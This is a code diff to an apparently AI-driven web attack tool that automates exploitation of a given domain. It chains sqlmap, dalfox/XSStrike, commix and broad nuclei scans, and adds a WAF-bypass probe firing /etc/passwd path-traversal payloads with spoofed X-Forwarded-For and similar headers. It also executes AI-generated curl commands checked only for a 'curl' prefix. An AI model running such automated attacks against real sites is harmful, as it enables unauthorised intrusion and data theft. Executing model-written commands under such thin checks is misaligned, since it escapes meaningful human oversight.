@@ -372,6 +372,27 @@ Return only the commands, one per line.
     return lines[:5]
 
 
+def _run_ai_curl_commands(domain: str, commands: list[str]) -> list[str]:
+    """Execute AI-generated curl commands in read-only mode with strict timeouts."""
+    if not commands:
+        return []
+
+    results = []
+    for cmd in commands[:5]:
+        # Ensure command is read-only and starts with curl
+        if not cmd.startswith("curl"):
+            continue
+        # Add silent output and timeout
+        safe_cmd = cmd.split()
+        safe_cmd += ["--silent", "--max-time", "10"]
+        r = _run_command(safe_cmd, timeout=30)
+        if r["returncode"] == 0 and r["stdout"]:
+            results.append(r["stdout"][:300])
+        else:
+            results.append(f"Command failed: {cmd}")
+
+    return results
+
 
 def _detect_cms(domain: str, technologies: list[str]) -> str:
     """Return detected CMS/framework name or 'unknown'."""
@@ -435,12 +456,51 @@ def _run_katana(domain: str) -> list[str]:
     return [line.strip() for line in r["stdout"].splitlines() if line.strip()][:100]
 
 def _run_arjun(domain: str) -> list[str]:
+    """Run Arjun and return actual URLs with discovered parameters."""
     tool = _find_tool("arjun")
     if not tool:
         return []
-    cmd = [sys.executable, tool, "-u", f"https://{domain}", "--stable"]
+
+    cmd = [sys.executable, tool, "-u", f"https://{domain}", "--stable", "-oJ"]
     r = _run_command(cmd, timeout=600)
-    return [line.strip() for line in r["stdout"].splitlines() if line.strip()]
+
+    raw = r["stdout"] or r["stderr"]
+    urls = []
+
+    # Try JSON output first
+    try:
+        data = json.loads(raw)
+        if isinstance(data, list):
+            for entry in data:
+                if isinstance(entry, dict):
+                    url = entry.get("url")
+                    params = entry.get("params", [])
+                    if url and params:
+                        for p in params:
+                            urls.append(f"{url}?{p}=FUZZ")
+                    elif url:
+                        urls.append(url)
+        elif isinstance(data, dict):
+            url = data.get("url")
+            params = data.get("params", [])
+            if url:
+                for p in params:
+                    urls.append(f"{url}?{p}=FUZZ")
+                if not params:
+                    urls.append(url)
+    except Exception:
+        # Fallback: parse plain lines for URL-like strings
+        for line in raw.splitlines():
+            line = line.strip()
+            if line.startswith(("http://", "https://")):
+                urls.append(line)
+
+    # Deduplicate and limit
+    unique = []
+    for u in urls:
+        if u not in unique:
+            unique.append(u)
+    return unique[:20]
 
 def _run_dalfox(domain: str) -> list[str]:
     tool = _find_tool("dalfox")
@@ -739,20 +799,40 @@ def _detect_waf(domain: str) -> list[str]:
     return waf if waf else ["No WAF detected."]
 
 def _waf_bypass_probe(domain: str) -> list[str]:
+    """Test common WAF bypass techniques using header spoofing and obfuscation."""
     payloads = [
         "/../../etc/passwd",
         "/%2e%2e/%2e%2e/etc/passwd",
         "/..%252f..%252fetc/passwd",
         "/%252e%252e/%252e%252e/etc/passwd",
+        "/....//....//etc/passwd",
+        "/..;/..;/etc/passwd",
+    ]
+    headers_variants = [
+        {},
+        {"X-Forwarded-For": "127.0.0.1"},
+        {"X-Real-IP": "127.0.0.1"},
+        {"True-Client-IP": "127.0.0.1"},
+        {"X-Originating-IP": "127.0.0.1"},
+        {"X-Forwarded-Host": "localhost"},
     ]
     results = []
+
     for payload in payloads:
-        try:
-            resp = requests.get(f"https://{domain}{payload}", timeout=10, proxies=get_requests_proxies())
-            if resp.status_code == 200 and "root:" in resp.text:
-                results.append(f"Possible traversal: {payload}")
-        except Exception:
-            pass
+        for headers in headers_variants:
+            try:
+                resp = requests.get(
+                    f"https://{domain}{payload}",
+                    timeout=10,
+                    headers={"User-Agent": "Mozilla/5.0", **headers},
+                    proxies=get_requests_proxies(),
+                )
+                if resp.status_code == 200 and "root:" in resp.text:
+                    results.append(f"Traversal bypass with {headers or 'no extra headers'}: {payload}")
+                    break
+            except Exception:
+                pass
+
     return results
 
 def _generate_dorks(domain: str) -> list[str]:
@@ -870,8 +950,8 @@ def _run_nuclei(domain: str) -> list[str]:
     cmd = [
         nuclei_exe,
         "-u", target,
-        "-severity", "critical,high,medium",
-        "-tags", "cve",
+        "-severity", "critical,high,medium,low",
+        "-tags", "cve,misconfig,exposure,rce,sqli,xss,lfi,ssrf,redirect,default-login,tech,panel,edb,oast",
         "-silent",
         "-jsonl",
         "-timeout", "10",
@@ -961,19 +1041,18 @@ def _check_ssl(domain: str) -> dict | None:
 # ---------------------------------------------------------------------------
 # Exploitation & Validation (after explicit confirmation)
 # ---------------------------------------------------------------------------
-def _run_sqlmap(domain: str) -> list[str]:
-    """Run sqlmap with crawling, forms, and higher risk settings."""
+def _run_sqlmap_on_url(url: str) -> list[str]:
+    """Run sqlmap against a specific URL or parameterised URL."""
     sqlmap_exe = _find_tool("sqlmap")
     if not sqlmap_exe:
         return []
 
-    target_url = f"https://{domain}"
     cmd = [
         sys.executable, sqlmap_exe,
-        "-u", target_url,
+        "-u", url,
         "--batch",
         "--random-agent",
-        "--crawl=3",
+        "--crawl=2",
         "--forms",
         "--level=2",
         "--risk=2",
@@ -985,28 +1064,48 @@ def _run_sqlmap(domain: str) -> list[str]:
     findings = []
     for line in (result["stdout"] + "\n" + result["stderr"]).splitlines():
         line = line.strip()
-        # Only keep confirmed injection/vulnerability lines
-        if "is vulnerable" in line.lower() or "injectable" in line.lower() or "sqlmap identified" in line.lower():
+        if any(k in line.lower() for k in (
+            "is vulnerable",
+            "injectable",
+            "sqlmap identified",
+            "parameter is vulnerable",
+            "payload:",
+        )):
             if line not in findings:
                 findings.append(line)
 
     return findings
 
 
-def _run_xsstrike(domain: str) -> list[str]:
-    """Run XSStrike with crawling and clean confirmed findings."""
+def _run_xss_on_url(url: str) -> list[str]:
+    """Run XSS detection using dalfox if available, otherwise XSStrike."""
+    # Prefer dalfox
+    dalfox_exe = _find_tool("dalfox")
+    if dalfox_exe:
+        cmd = [dalfox_exe, "url", url, "--silence", "--no-color"]
+        result = _run_command(cmd, timeout=1800)
+        findings = []
+        for line in (result["stdout"] + "\n" + result["stderr"]).splitlines():
+            line = line.strip()
+            if line and "info" not in line.lower():
+                findings.append(line)
+        if findings:
+            return findings
+
+    # Fallback to XSStrike
     xsstrike = _find_tool("xsstrike")
     if not xsstrike:
         return []
 
-    target_url = f"https://{domain}"
-    cmd = ["python", xsstrike, "-u", target_url, "--crawl", "--console-log-level", "WARNING"]
+    cmd = [sys.executable, xsstrike, "-u", url, "--crawl", "--console-log-level", "WARNING"]
     result = _run_command(cmd, timeout=1800)
 
     findings = []
     for line in (result["stdout"] + "\n" + result["stderr"]).splitlines():
         line = line.strip()
-        if any(k in line.lower() for k in ("reflected", "dom xss", "stored xss", "vulnerable", "xss found")):
+        if any(k in line.lower() for k in (
+            "reflected", "dom xss", "stored xss", "vulnerable", "xss found"
+        )):
             if line not in findings:
                 findings.append(line)
 
@@ -1182,6 +1281,14 @@ def _generate_pdf(results: dict) -> Path:
     _write_pdf_section(pdf, "[21] DEEP PROBE FINDINGS", results.get("deep_findings", []))
     pdf.ln(4)
 
+    # Smart exploitation results
+    _write_pdf_section(pdf, "[22] SMART EXPLOITATION RESULTS", results.get("xss_findings", []))
+    pdf.ln(3)
+    _write_pdf_section(pdf, "[23] WAF BYPASS PROBES", results.get("waf_bypass", []))
+    pdf.ln(3)
+    _write_pdf_section(pdf, "[24] AI CURL COMMAND RESULTS", results.get("ai_command_results", []))
+    pdf.ln(3)
+
     # Extra advanced sections
     for idx, (title, key) in enumerate([
         ("LIVE URLs", "live_urls"),
@@ -1190,9 +1297,8 @@ def _generate_pdf(results: dict) -> Path:
         ("WAF DETECTION", "waf_detection"),
         ("WHATWEB TECHNOLOGIES", "whatweb"),
         ("AI GENERATED COMMANDS", "ai_commands"),
-        ("WAF BYPASS PROBES", "waf_bypass"),
     ], start=1):
-        _write_pdf_section(pdf, f"[{21 + idx}] {title}", results.get(key, []))
+        _write_pdf_section(pdf, f"[{24 + idx}] {title}", results.get(key, []))
         pdf.ln(3)
 
     # Executive summary
@@ -1204,10 +1310,10 @@ def _generate_pdf(results: dict) -> Path:
         f"Open ports: {total_ports}",
         f"Web findings: {len(results.get('nikto_findings', []))}",
         f"CVE findings: {len(results.get('nuclei_findings', []))}",
-        f"Exploit findings: {len(results.get('sqlmap_findings', [])) + len(results.get('xsstrike_findings', [])) + len(results.get('commix_findings', [])) + len(results.get('lfisuite_findings', []))}",
+        f"Exploit findings: {len(results.get('sqlmap_findings', [])) + len(results.get('xss_findings', [])) + len(results.get('commix_findings', [])) + len(results.get('lfisuite_findings', [])) + len(results.get('waf_bypass', []))}",
         f"SSL valid until: {ssl_info.get('expires', 'unknown')}",
     ]
-    _write_pdf_section(pdf, "[29] EXECUTIVE SUMMARY", summary_lines, max_items=30)
+    _write_pdf_section(pdf, "[31] EXECUTIVE SUMMARY", summary_lines, max_items=30)
 
     pdf.output(str(filepath))
     return filepath
@@ -1255,13 +1361,13 @@ Return a concise report.
         if droopescan:
             extra["deep_findings"].extend(droopescan)
 
-    # Run XSStrike if a login/admin/search page was found
+    # Run XSS detection if a login/admin/search page was found
     dirs = initial_findings.get("directories", [])
     if dirs:
         extra["deep_findings"].append("Discovered sensitive paths: " + ", ".join(dirs[:10]))
         for d in dirs:
             if any(k in d.lower() for k in ("login", "admin", "search", "query")):
-                xs = _run_xsstrike(f"https://{domain}")
+                xs = _run_xss_on_url(f"https://{domain}")
                 if xs:
                     extra["deep_findings"].extend(xs)
                 break
@@ -1364,10 +1470,41 @@ def security_mode(parameters: dict, player=None, speak=None) -> str:
     results["droopescan_findings"] = _run_droopescan(domain)
 
     # --------------------------- Exploit ---------------------------
-    results["sqlmap_findings"] = _run_sqlmap(domain)
-    results["xsstrike_findings"] = _run_xsstrike(domain)
+    # Discover hidden parameters first (Arjun)
+    hidden_params = _run_arjun(domain)
+    results["hidden_params"] = hidden_params
+
+    # Select test URLs: use parameterised URLs if found, else root URL
+    if hidden_params:
+        test_urls = hidden_params[:3]
+    else:
+        test_urls = [f"https://{domain}/"]
+
+    sqlmap_findings = []
+    xss_findings = []
+    for url in test_urls:
+        sqlmap_findings.extend(_run_sqlmap_on_url(url))
+        xss_findings.extend(_run_xss_on_url(url))
+
+    # Deduplicate
+    results["sqlmap_findings"] = list(dict.fromkeys(sqlmap_findings))
+    results["xsstrike_findings"] = list(dict.fromkeys(xss_findings))  # keep old key for compatibility
+    results["xss_findings"] = results["xsstrike_findings"]
+
     results["commix_findings"] = _run_commix(domain)
     results["lfisuite_findings"] = _run_lfisuite(domain)
+
+    # WAF bypass probes
+    results["waf_bypass"] = _waf_bypass_probe(domain)
+
+    # AI curl commands
+    ai_commands = _generate_ai_commands(
+        domain,
+        results.get("technologies", []),
+        results.get("waf", []),
+    )
+    results["ai_commands"] = ai_commands
+    results["ai_command_results"] = _run_ai_curl_commands(domain, ai_commands)
 
     # --------------------------- SSL ---------------------------
     results["ssl_info"] = _check_ssl(domain)
